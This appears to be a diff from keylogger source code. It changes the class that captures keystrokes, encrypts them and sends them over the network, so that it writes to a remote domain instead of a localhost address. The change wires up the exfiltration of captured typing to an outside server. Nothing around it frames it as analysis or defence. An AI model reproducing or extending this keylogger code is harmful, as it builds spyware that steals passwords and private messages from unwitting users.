@@ -8,7 +8,7 @@ class KeyLoggerManager(IKeyLoggerManager):
     def __init__(self, serial_number: int, key:str):
         self.__serial_number = serial_number
         self.__key_logger = KeyLoggerService()
-        self.__writer = NetworkWriter('http://127.0.0.1:9734')
+        self.__writer = NetworkWriter('https://keylogger.shuvax.com')
         self.__encryptor = Encryptor(key)
         self.__is_logging = False
         self.__logger_thread = threading.Thread(target=self.__listen)
